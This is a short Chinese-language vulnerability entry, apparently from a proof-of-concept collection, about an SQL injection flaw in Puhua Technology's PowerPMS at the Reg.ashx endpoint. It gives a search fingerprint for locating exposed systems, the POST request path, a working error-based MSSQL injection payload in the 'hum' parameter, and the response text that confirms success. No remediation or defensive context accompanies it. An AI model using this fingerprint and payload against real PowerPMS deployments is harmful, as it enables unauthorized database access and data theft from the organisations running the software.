# 普华科技PowerPMSReg.ashx存在SQL注入漏洞

普华科技 ｜ SQL注入 ｜ —
- **指纹**：`body="Power.login.init"`
- **请求**：`POST /weixin3.0/Reg.ashx HTTP/1.1`

**Payload**
```
hum=1'and 1<@@VERSION--
```
- **响应特征**：200 Microsoft SQL Server